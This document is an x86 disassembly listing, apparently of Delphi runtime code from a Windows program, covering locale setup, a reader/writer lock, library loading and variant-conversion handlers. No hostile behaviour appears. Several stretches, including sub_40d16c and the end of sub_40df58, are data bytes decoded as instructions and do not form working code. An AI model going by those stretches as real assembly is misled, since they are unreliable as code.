push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_4086f4
mov [ esp ] eax
mov eax ebp
call sub_4086f4
mov edi eax
mov edx ebp
mov eax esi
call sub_40888c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c014
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_40888c
mov ebx eax
inc ebx
sub_40c478
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c4a0
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c4a0
test eax eax
jne r-xdata
sub_40c4a0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408878
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c014
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408878
mov edi eax
test edi edi
jne r-xdata
sub_40c4e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c544
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4042e4
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_4081c4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c54b
lea eax [ ebp - 0xc ]
call sub_404074
retn
sub_40c554
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c4e0
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c5cc
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c5b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c554
pop ecx
push ebp
call sub_40c554
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402de0
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c740
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40ca0b
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c5cc
call sub_40af30
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40ae80
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_4040c8
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40ae80
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4081c4
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40ae80
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4081c4
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40aecc
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40aecc
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40ae80
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4081c4
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40aecc
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40ae80
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b1b8
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_4040c8
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40ae80
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b1b8
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_4040c8
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40aecc
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40ae80
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_4040c8
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40ae80
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_4040c8
lea eax [ ebp - 0x8 ]
call sub_404074
lea eax [ ebp - 0xc ]
call sub_404074
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40ae80
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4081c4
test eax eax
jne r-xdata
call sub_40b108
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40410c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40410c
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4043f4
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4043f4
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40aecc
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ca12
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_404098
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40ae80
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4081c4
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40ae80
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4081c4
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40410c
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40410c
jmp r-xdata
sub_40cac0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cb50
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ae34
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cb57
lea eax [ ebp - 0x14 ]
call sub_404074
retn
sub_40cba8
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408680
mov [ rw-data ] eax
sub_40cc2c
push ebx
push esi
push edi
push ebp
call sub_40362c
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026ec
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403290
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403614
sub_40cc94
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40cc7c
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cd1c
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407c78
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cc1c
mov [ ebp ] eax
sub_40cd1c
push ebx
mov ebx eax
mov eax ebx
call sub_40cc7c
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cc1c
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40cd5c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403270
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_40cdd0
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_40ce5c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_40ce5c
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40ce18
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40cc94
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cc24
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cc04
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cc24
test eax eax
je r-xdata
mov eax edi
call sub_40ce18
test bl bl
je r-xdata
mov eax edi
call sub_40ce4c
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cc04
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cc10
sub_40cef8
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cc94
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cc24
mov eax ebx
call sub_40ce30
mov eax ebx
call sub_40ce24
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cd0c
sub_40cf48
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40cc94
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40ce3c
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cc10
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cc04
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40ce3c
mov eax esi
call sub_40ce30
sub_40cfb4
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cc94
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cd0c
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cc04
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40ce30
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40ce30
sub_40d02c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d050
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d0c7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4056e0
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403354
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d0ce
lea eax [ ebp - 0x4 ]
call sub_4056e0
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403354
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d02c
test al al
jne r-xdata
mov al 0x1
sub_40d0e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d15a
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d13c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404534
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d143
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d16c
sbb eax 0x4000000
and ecx [ eax ]
enter 0x4838 0x0
cld
and cl [ eax ]
xor [ edi ] 0x48
add ah dh
and cl [ eax ]
and [ 0x22ec0048 ] dh
dec eax
add [ ecx + edi ] bh
dec eax
add ah ah
and cl [ eax ]
cmp [ ecx ] 0x48
add ah bl
and cl [ eax ]
inc esp
dec eax
add ah dl
and cl [ eax ]
pushad
aaa
dec eax
add ah cl
and cl [ eax ]
int3
sub_40d5bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d624
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d62b
retn
mov eax sub_40d16c
call sub_403d9c
mov eax r-xdata
call sub_403dc4
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bcf8
call sub_40bdfc
call sub_40cba8
call sub_40c740
mov eax rw-data
mov edx r-xdata
call sub_4040c8
sub_40d65c
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d6b0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d70a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042fc
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4081dc
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d711
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40d71c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d776
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042fc
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409590
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d77d
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40d788
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d7e2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042fc
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409564
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7e9
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40d7f4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d84e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042fc
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40ada8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d855
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40d860
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d8ba
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042fc
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4095bc
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8c1
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40d8cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d939
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4042fc
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_4082c8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d940
lea eax [ ebp - 0x8 ]
call sub_404074
retn
sub_40d94c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d9ac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409518
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4048a0
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d9b3
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40d9bc
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40da1c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a568
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4048a0
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da23
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40da2c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40da90
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408364
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4048a0
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da97
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40dac0
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40daec
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d65c
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d68c
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d68c
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d698
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d698
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d698
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d698
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d698
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d698
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d698
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d698
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d698
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6a4
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6b0
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d71c
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d788
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7f4
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d860
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8cc
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d94c
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d9bc
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da2c
mov eax r-xdata
call sub_40dac0
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40ddf8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40de1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de24
retn
sub_40df58
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc0040df ]
jo r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
add [ eax ] bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
loopne r-xdata
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
push esi
popad
jb r-xdata
popad
outsb
